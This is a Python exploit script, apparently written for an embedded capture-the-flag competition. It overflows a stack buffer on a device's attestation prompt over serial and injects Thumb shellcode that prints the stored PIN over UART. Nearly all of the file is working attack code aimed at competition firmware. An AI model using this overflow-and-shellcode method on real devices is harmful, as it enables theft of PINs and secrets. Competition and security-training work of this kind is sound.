# Adaptation of attestation_tool.py for pwning

# AUTHOR: Gabe Samide

# Uses shellcode to write to the UART Registers and print out
# the token or pin bit by bit

import argparse
import serial
import re
from loguru import logger
import sys
import pwn

# Logger formatting
fmt = (
    "<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | "
    "{extra[extra]: <6} | "
    "<level>{level: <8}</level> | "
    "<level>{message}</level> "
)

logger.remove(0)
logger.add(sys.stdout, format=fmt)


def create_payload():
    elf = pwn.context.binary = pwn.ELF("build/ap.elf")
    # Change to addr of puts
    puts_addr = 0x10016334 - 1
    # Change to addr of pin
    pin_addr = 0x10020658
    # Change to addr of token
    token_addr = 0x10020690
    # Change to addr of buffer
    buffer_addr = 0x2001ff54 - 1
    # Finds the recv_input symbol
    recv_input = elf.symbols['recv_input'] - 1
    # NGL do not remember what the below addrs were for, surely they aren't important... probably debugging
    # random_validate_pin_addr = 0x1001090c -1
    # random_main_addr = 0x10010b86 - 1

    # Change to offset to return address
    offset_to_return_addr = 56

    # Change to UART FIFO register location; the default location of all UART regs
    # is 0x40042000 and the offset to the FIFO reg is 0x20
    uart_fifo_tx = 0x40042000 + 0x20
    uart_nctl = 0x40042000

    puts_shellcode = f"""
        nop
        nop
        nop
        ldr r0, ={hex(pin_addr)}
        ldr r1, ={hex(puts_addr)}
        sub sp, 32
        bx r1

    """

    # random shenanigans to try and set the 8th bit of the uart_ctl reg to flush fifo
    # ldr r5, ={hex(uart_nctl)}
    # ldr r8, [r5]
    # mov r3, #1
    # str r3, [r5]
    shellcode = pwn.asm(puts_shellcode, arch="thumb", vma=0x10010000)
    padding = offset_to_return_addr - len(shellcode)
    # payload = shellcode + (b"a" * (offset_to_return_addr - shellcode_len)) + pwn.p32(buffer_addr, endian="little")
    payload = pwn.flat([
        shellcode,
        b'a' * padding,
        buffer_addr
    ])
    return payload


# Pwn AP
def pwn_ap(args):
    ser = serial.Serial(
        port=args.application_processor,
        baudrate=115200,
        parity=serial.PARITY_NONE,
        stopbits=serial.STOPBITS_ONE,
        bytesize=serial.EIGHTBITS,
    )

    # Junk pin
    payload = create_payload()
    # Arguments passed to the AP
    input_list = [
        b"attest\r",
        payload + b"\r",
    ]

    # Send and receive messages until done
    message = input_list.pop(0)
    ser.write(message)
    logger.bind(extra="INPUT").debug(message)

    output = ""
    while True:
        byte = ser.read()
        char = byte.decode("utf-8", errors="ignore")
        output += char
        # print(output)
        output = process_output(output, input_list, ser)


def process_output(output, input_list, ser):
    # Find INFO level messages
    match = re.search("%info: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").info(line.strip())
    # Find DEBUG level messages
    match = re.search("%debug: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").debug(line.strip())
    # Find ACK level messages
    match = re.search("%ack%", output)
    if match != None:
        used = True
        # Send next message
        output = output[:match.start()] + output[match.end():]
        message = input_list.pop(0)
        ser.write(message)
        logger.bind(extra="INPUT").debug(message)
    # Find SUCCESS level messages
    match = re.search("%success: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").success(line.strip())
        # exit(0)
    # Find ERROR level messages
    match = re.search("%error: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").error(line.strip())
        # exit(1)

    # ENSURE you change this before you run an exploit to match the regex of what you expect
    # to see over UART
    match = re.search(r"[0-9A-Fa-f]{6}", output)
    if match != None and match.string != "aaaaaa":
        output = output[:match.start()] + output[match.end():]
        m = match.string.split('\n')
        for ind, i in enumerate(m):
            if i.strip() != "aaaaaa" and i.strip() != "":
                logger.bind(extra="OUTPUT").info("The PIN is: " + i)

    return output


def main():
    # Parse arguments
    parser = argparse.ArgumentParser(
        prog="eCTF Overflow Exploitation Tool",
        description="Pwn an AP",
    )

    parser.add_argument(
        "-a",
        "--application-processor",
        required=True,
        help="Serial device of the AP"
    )

    args = parser.parse_args()
    pwn_ap(args)


if __name__ == "__main__":
    main()
